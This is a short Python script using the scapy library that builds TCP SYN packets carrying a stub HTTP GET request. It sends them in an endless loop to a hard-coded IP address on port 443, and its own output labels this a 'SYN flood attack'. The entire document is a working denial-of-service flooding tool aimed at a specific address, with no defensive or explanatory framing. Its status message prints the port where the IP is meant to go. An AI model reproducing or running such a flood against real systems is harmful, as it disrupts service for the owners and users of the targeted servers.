from scapy.all import *
import pprint
target_ip = "104.18.12.173"
target_port = 443

ip = IP(dst=target_ip)

tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

raw = Raw(load="GET / HTTP/1.1\r ")


pkt = ip/tcp/raw


y = "\033[0;34mSYN flood attack sent to"+ "\033[0;34m target_ip: "+str(target_port)+" \033[0;32m"
print(y)
# print the contents of the packet using pprint

pprint.pprint(pkt, indent=16)
# print out the incoming packets
send(pkt, loop=1, verbose=0)

